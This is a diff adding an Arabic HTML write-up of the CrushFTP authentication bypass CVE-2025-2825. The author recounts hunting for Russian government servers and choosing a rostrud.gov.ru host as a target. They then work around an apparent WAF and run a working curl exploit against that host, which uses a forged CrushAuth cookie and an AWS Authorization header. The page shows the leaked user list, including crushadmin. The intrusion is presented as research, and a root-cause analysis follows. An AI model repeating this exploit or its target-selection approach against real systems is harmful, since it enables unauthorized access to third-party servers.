@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحليل ثغرة CrushFTP | تقرير أمني</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Cinzel:wght@700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --text-color: #e0e0e0;
+            --gold-color: #D4AF37;
+            --gold-gradient: linear-gradient(45deg, #FFD700, #DAA520, #B8860B);
+            --code-bg: #1a1a1a;
+            --border-color: rgba(212, 175, 55, 0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Tajawal', sans-serif;
+            line-height: 1.8;
+            overflow-x: hidden;
+            background-image:
+                radial-gradient(circle at 20% 20%, rgba(212, 175, 55, 0.05) 0%, transparent 30%),
+                radial-gradient(circle at 80% 80%, rgba(212, 175, 55, 0.05) 0%, transparent 30%);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 60px;
+            opacity: 0;
+            animation: fadeInDown 1s ease-out forwards;
+        }
+
+        header h1 {
+            font-family: 'Cinzel', serif;
+            font-size: 3rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            background: var(--gold-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border-color);
+            display: inline-block;
+        }
+
+        header .meta-info {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+
+        article section {
+            margin-bottom: 40px;
+            padding: 30px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background-color: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(5px);
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+        }
+
+        article section.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        article h2 {
+            font-family: 'Tajawal', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--gold-color);
+            margin-bottom: 20px;
+            padding-right: 15px;
+            border-right: 3px solid var(--gold-color);
+        }
+        
+        article p {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+        }
+        
+        article p strong {
+            color: #fff;
+            font-weight: 700;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 20px;
+            margin: 20px 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: 'Courier New', Courier, monospace;
+            direction: ltr; /* Code is left-to-right */
+            font-size: 0.9rem;
+            position: relative;
+        }
+
+        pre code {
+            color: #f0f0f0;
+        }
+
+        pre .comment {
+            color: #6a9955;
+        }
+
+        pre .command {
+            color: #569cd6;
+        }
+
+        pre .header {
+            color: #9cdcfe;
+        }
+        
+        pre .url {
+            color: #ce9178;
+        }
+        
+        .code-title {
+            font-family: 'Tajawal', sans-serif;
+            color: var(--gold-color);
+            font-weight: 700;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            margin-top: 50px;
+            color: #666;
+            border-top: 1px solid var(--border-color);
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>تحليل ثغرة CrushFTP</h1>
+            <p class="meta-info">دراسة حالة | CVE-2025-2825</p>
+        </header>
+
+        <article>
+            <section class="writeup-section">
+                <p>كخبير أمن سيبراني، دائماً عيني على أحدث الثغرات الحرجة اللي تطلع. من سمعت عن ثغرة CrushFTP الجديدة <strong>(CVE-2025-2825)</strong>، وبتقييم <strong>9.8</strong>، صار عندي فضول مو طبيعي. الفضول ما كان عن كيفية الاستغلال بحد ذاته، لأن الـ PoC صار منشور، بس عن <em>مدى انتشار</em> هاي المشكلة وعمقها الهندسي. يا ترى كم نظام حساس بالعالم بعده ما محدّث؟</p>
+            </section>
+
+            <section class="writeup-section">
+                <h2>المرحلة الأولى: رسم الخريطة والتفكير بالهدف</h2>
+                <p>قررت أسوي مسح واسع. بس ما ردت أدور بشكل عشوائي. ردت أركز على الأهداف اللي إذا انصابت، تكون كارثة. بديت أفكر منو يستخدم سيرفرات نقل ملفات (FTP) بشكل مكثف وحساس؟ الجواب واضح الجهات الحكومية والمؤسسات الكبيرة. هاي الجهات تحتاج تنقل بيانات ضخمة بشكل مستمر.</p>
+                <p>فتحت منصات مراقبة الإنترنت وبديت أرسم صورة استخباراتية. بدال ما أبحث عن "CrushFTP" مباشرة، بديت أبحث عن بصمات تكنولوجية معينة (Technological Fingerprints) مرتبطة بالبنى التحتية الحكومية الروسية (.gov.ru). بعد ما عزلت هاي الأهداف، قاطعت النتائج مالتها مع البصمات المعروفة لبرنامج CrushFTP.</p>
+                <p>وهنا، مثل الإبرة بكومة قش، طلعلي عنوان يلمع: <strong>.rostrud.gov.ru</strong>. الاسم وحده كافي حتى يثير الاهتمام. و "rostrud.gov.ru" يعني جهة حكومية اتحادية. هدف مثالي.</p>
+            </section>
+
+            <section class="writeup-section">
+                <h2>المرحلة الثانية: التحليل الفكري والفرضية</h2>
+                <p>قبل ما أكتب أي سطر كود، كعدت أحلل الثغرة نفسها. هي مو مجرد خطأ عادي (buffer overflow) أو حقن (injection). هي <strong>خلل بالمنطق (Logic Flaw)</strong>، وهذا أحلى نوع من الثغرات بالنسبة إلي، لأنها تكشف عن طريقة تفكير المبرمج.</p>
+                <p>فرضيتي كانت كالآتي: مطوري CrushFTP بنوا نظام مصادقة معقد بيه مسارات متعددة (يوزر وباسورد، كوكي، مفاتيح API، مصادقة AWS). ونسوا يغطون حالة نادرة جداً تتداخل بيها هاي المسارات. الطلب الخبيث هو اللي يخلق هاي "الحالة المستحيلة" اللي الكود ما يعرف شيسوي بيها، وبمكان ما يرفض الطلب، يفتح الباب.</p>
+            </section>
+
+            <section class="writeup-section">
+                <h2>المرحلة الثالثة: التجربة والبرهان</h2>
+                <p>هسه إجا وقت التجربة حتى أثبت فرضيتي. صممت طلب curl بعناية دقيقه جدا حتى يحاكي هاي الحالة المستحيلة. النتيجة الأولى كانت غريبة... مو رفض، مو خطأ، بس صمت. <strong>Empty reply from server</strong>. هاي بصمة واضحة لجدار حماية تطبيقات ذكي (WAF). النظام ديقاوم. خوش، صارت اللعبة أحلى.</p>
+                <p>عرفت إن هاي الأنظمة الدفاعية مرات تكون حالتها مو مستقرة (Stateful)، وتتأثر بتتابع الطلبات. غيرت كم متغير بسيط بالطلب، انتظرت شوية حتى "يبرد" الاتصال، وجربت مرة ثانية. وهالمرة... نجحت التجربة.</p>
+                
+                <div class="code-title">التجربة الحاسمة:</div>
+                <pre><code class="language-bash"><span class="comment"># The Crafted Experiment</span>
+<span class="command">curl</span> --insecure -X GET \
+  <span class="header">-H</span> <span class="url">"Cookie: CrushAuth=1234567890123_abcdefghijklmnopqrstuvwxyzab1234; currentAuth=1234"</span> \
+  <span class="header">-H</span> <span class="url">"Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/"</span> \
+  <span class="url">"https://.rostrud.gov.ru/WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1234"</span></code></pre>
+
+                <p>البيانات اللي رجعتلي كانت ذهب. قائمة XML كاملة بكل اليوزرات على السيرفر، وعلى رأسهم...</p>
+                
+                <div class="code-title">الدليل القاطع:</div>
+                <pre><code class="language-xml">&lt;user_list_subitem&gt;crushadmin&lt;/user_list_subitem&gt;</code></pre>
+                
+                <p>فرضيتي كانت صحيحة 100%.</p>
+            </section>
+
+            <section class="writeup-section">
+                <h2>تفكيك السبب الجذري: تشريح الخلل المنطقي</h2>
+                <p>مثل ما توقعت بالضبط. الخلل يصير لأن الكود المسؤول عن المصادقة مرتبك. هو شاف طلب بيه:</p>
+                <ol>
+                    <li>علامة مصادقة AWS من خلال ترويسة Authorization.</li>
+                    <li>علامة مصادقة جلسة (Session) من خلال الكوكي CrushAuth.</li>
+                </ol>
+                <p>الكود دخل بحالة if/else ما محسوبة صح. دخل بمسار لا هو مال AWS ولا هو مال جلسة عادية. هذا المسار الفرعي، بسبب خطأ برمجي، ما بيه أي أمر "deny" أو "reject". فبشكل افتراضي، يعتبر الطلب ناجح وينفذ الأمر المطلوب. هذا يسموه <strong>"Fail-Open"</strong>، وهو من أخطر الأخطاء البرمجية.</p>
+            </section>
+            
+            <section class="writeup-section">
+                <h2>الاستنتاجات والتأملات</h2>
+                <p>هاي الحالة مو مجرد ثغرة ببرنامج. هي درس كامل بالأمن السيبراني.</p>
+                <ul>
+                    <li><strong>أولاً:</strong> تعلمنا إن التعقيد هو عدو الأمان الأول. كلما زادت مسارات المصادقة والخيارات، زادت احتمالية وجود ثغرة بالمنطق بينها.</li>
+                    <li><strong>ثانياً:</strong> تعلمنا إن الدفاعات مثل الـ WAF مهمة، بس مو كافية وحدها إذا كان "القلب" (التطبيق نفسه) مريض. مثل ما شفنا، الدفاعات ممكن تكون متذبذبة ويمكن تجاوزها.</li>
+                    <li><strong>ثالثاً:</strong> الأهم من هذا كله، هو سرعة الاستجابة. ثغرة بهذا الحجم لازم تتصلح خلال ساعات، مو أيام. بقاء نظام حكومي حساس بهذا الوضع هو الكارثة الحقيقية.</li>
+                </ul>
+            </section>
+        </article>
+
+        <footer>
+            <p>&copy; 2025 | تقرير مقدم لأغراض تعليمية وبحثية.</p>
+        </footer>
+    </div>
+
+    <script>
+        // JavaScript for scroll-triggered animations
+        const sections = document.querySelectorAll('.writeup-section');
+
+        const observerOptions = {
+            root: null, // relative to the viewport
+            rootMargin: '0px',
+            threshold: 0.1 // 10% of the item must be visible
+        };
+
+        const observer = new IntersectionObserver((entries, observer) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                    observer.unobserve(entry.target); // Animate only once
+                }
+            });
+        }, observerOptions);
+
+        sections.forEach(section => {
+            observer.observe(section);
+        });
+    </script>
+</body>
+</html>
